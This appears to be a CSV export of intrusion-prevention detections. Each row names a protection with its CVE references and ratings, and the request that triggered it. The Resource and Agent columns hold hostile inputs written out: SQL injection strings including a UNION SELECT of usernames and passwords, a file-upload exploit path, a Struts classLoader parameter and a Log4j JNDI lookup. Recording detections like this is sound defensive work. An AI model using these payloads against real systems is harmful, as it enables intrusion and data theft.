ProtectionName,IndustryReference,Method,Resource,Service,ConfidenceLevel,Severity,PerformanceImpact,Agent
Flexible Poll SQL Injection (CVE-2018-5988),CVE-2018-5988,GET,http://203.0.113.250/cgi-bin/index.php?id=',http,Medium,Critical,Medium,
IMP SQL Injection (CVE-2003-0025),CVE-2003-0025,GET,http://203.0.113.250/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x,http,Medium,High,Medium,
SQL Injection Scanning Attempt,"CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780",GET,http://203.0.113.250/interscan/cgi-bin/FtpSave.dll?I'm Here,http,High,Critical,Medium,
SQL Servers SQL Injection Evasion Techniques,"CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225",GET,"http://203.0.113.250/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",http,High,Critical,Medium,
SQL Servers Unauthorized Commands SQL Injection,"CVE-2014-3704,CVE-2019-13978,CVE-2019-9053,CVE-2021-41843,CVE-2022-0592,CVE-2022-0781,CVE-2022-0836,CVE-2022-1905,CVE-2022-26887,CVE-2022-28346,CVE-2022-30809,CVE-2022-30810,CVE-2022-30815,CVE-2024-33559",GET,http://203.0.113.250/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--,http,High,High,Medium,
SQL Servers UNION Query-based SQL Injection,"CVE-2022-31061,CVE-2022-32007,CVE-2022-32025,CVE-2022-32026,CVE-2022-32028,CVE-2022-38627,CVE-2022-40049,CVE-2022-44137,CVE-2022-45030,CVE-2022-46124,CVE-2022-47860,CVE-2023-20110,CVE-2023-46748,CVE-2023-51951",GET,"http://203.0.113.250/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1",http,High,Critical,Medium,
Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload,"CVE-2008-6178,CVE-2009-2265",GET,http://203.0.113.250/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php.,http,High,High,Medium,
Apache Log4j Remote Code Execution (CVE-2021-44228),"CVE-2021-44228,CVE-2021-45046",GET,http://203.0.113.250/,http,Medium,Critical,Medium,${jndi:ldap://127.0.0.1#log4shell-generic-c6hAKQa3xrV889pe4Lrm.w.nessus.org/nessus}
Apache Log4j Remote Code Execution over Non-Standard Ports,CVE-2021-44228,,,http,Medium,Critical,High,
Apache Struts ParametersInterceptor ClassLoader Security Bypass,"CVE-2014-0094,CVE-2014-0112,CVE-2014-0113,CVE-2014-0114",GET,http://203.0.113.250/?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1731362486,http,Medium,Critical,Medium,
